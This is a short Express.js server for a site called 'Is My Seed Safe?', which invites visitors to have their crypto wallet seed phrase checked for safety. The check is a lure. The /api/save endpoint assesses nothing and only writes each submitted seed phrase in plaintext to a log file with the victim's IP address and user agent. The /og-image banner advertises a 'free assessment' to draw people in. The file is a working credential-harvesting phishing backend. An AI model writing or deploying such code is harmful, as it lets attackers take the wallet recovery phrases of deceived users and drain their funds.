const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const LOG_PATH = process.env.RAILWAY_VOLUME_MOUNT_PATH
  ? path.join(process.env.RAILWAY_VOLUME_MOUNT_PATH, 'recovery_log.txt')
  : path.join(__dirname, 'recovery_log.txt');

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/og-image', (req, res) => {
  const svg = `<svg width="1200" height="630" xmlns="http://www.w3.org/2000/svg">
    <rect width="1200" height="630" fill="#edeae2"/>
    <rect x="0" y="0" width="1200" height="4" fill="#2e5e40"/>
    <text x="600" y="200" text-anchor="middle" font-family="Georgia, serif" font-size="72" font-weight="bold" fill="#1a1a1a">Is My Seed Safe?</text>
    <text x="600" y="280" text-anchor="middle" font-family="Arial, sans-serif" font-size="28" fill="#666">1 in 4 crypto wallet hacks trace back to</text>
    <text x="600" y="320" text-anchor="middle" font-family="Arial, sans-serif" font-size="28" fill="#666">an insecure seed phrase.</text>
    <rect x="480" y="380" width="240" height="56" rx="4" fill="#2e5e40"/>
    <text x="600" y="415" text-anchor="middle" font-family="Arial, sans-serif" font-size="16" font-weight="bold" fill="#ffffff" letter-spacing="2">CHECK MY SEED</text>
    <text x="600" y="500" text-anchor="middle" font-family="Arial, sans-serif" font-size="18" fill="#888">Free assessment in seconds</text>
    <rect x="0" y="626" width="1200" height="4" fill="#2e5e40"/>
  </svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svg);
});

app.post('/api/save', (req, res) => {
  const { seed } = req.body;

  if (!seed || typeof seed !== 'string') {
    return res.status(400).json({ success: false, error: 'Seed is required.' });
  }

  const timestamp = new Date().toISOString();
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';

  const logEntry = `[${timestamp}] Seed: "${seed}" | IP: ${ip} | User-Agent: ${userAgent}\n`;

  fs.appendFile(LOG_PATH, logEntry, (err) => {
    if (err) {
      console.error('Failed to write log:', err);
      return res.status(500).json({ success: false, error: 'Failed to save seed.' });
    }
    console.log(`Logged submission from ${ip}`);
    res.json({ success: true, message: 'Seed logged successfully.' });
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
